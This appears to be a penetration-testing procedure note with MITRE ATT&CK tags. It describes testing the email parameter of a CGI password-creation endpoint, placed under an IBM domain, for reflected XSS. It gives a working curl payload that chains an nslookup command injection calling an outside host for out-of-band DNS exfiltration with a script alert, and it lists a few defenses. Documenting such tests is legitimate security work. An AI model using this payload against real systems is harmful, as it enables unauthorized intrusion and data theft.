---
tags:
  - xss
  - reflected
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/test-xss-payload]]'
  - '[[commands/nslookup-oob-dns-exfiltration]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-13T23:52:39.000Z'
sub_techniques: []
id: c783d2ce-690f-45b3-9778-c07568acedea
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
---
# Test Email Parameter for Reflected XSS

## Summary

This procedure tests the email GET parameter for reflected XSS by injecting a payload with shell metacharacters and JavaScript, leading to arbitrary code execution in the victim's browser.

## Description

The vulnerability stems from improper escaping of special characters like '&' and lack of HTML/JS sanitization in the CGI script. The payload chains an OOB command with <script>alert(1)</script>, which reflects and executes. This enables session theft or redirects under the IBM domain.

## Requirements

1. Access to the /cgi-bin/PasswordCreate.pl endpoint
2. URL encoder for payload crafting
3. Browser to observe execution

## Defense

Defensive measures and detection strategies:

- Implement output encoding for HTML/JS contexts
- Deploy CSP to block inline scripts
- Monitor for anomalous JS in responses

## Objectives

1. Trigger JavaScript execution via reflection
2. Confirm lack of sanitization
3. Demonstrate potential for data exfiltration

## Instructions

### Step 1: Craft and Send XSS Payload

**Context**: URL-encode the payload to bypass filters and chain commands.

**Command** ([[commands/test-xss-payload]]):
```bash
curl "http://target/cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submit"
```

> The payload decodes to email=&nslookup "..."<script>alert(1)</script>..., reflecting and executing the alert.

### Step 2: Observe Execution

**Context**: Load the URL in a browser to see client-side effects.

**Command** (Browser Load):
```bash
# Open in browser: http://target/cgi-bin/PasswordCreate.pl?email=... (decoded payload)
```

> Expected output: Alert box pops up, confirming XSS.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used

- [[commands/test-xss-payload]]
- [[commands/nslookup-oob-dns-exfiltration]]

## Tools Used


## Tags

- [[xss]]
- [[reflected]]
- [[JavaScript]]
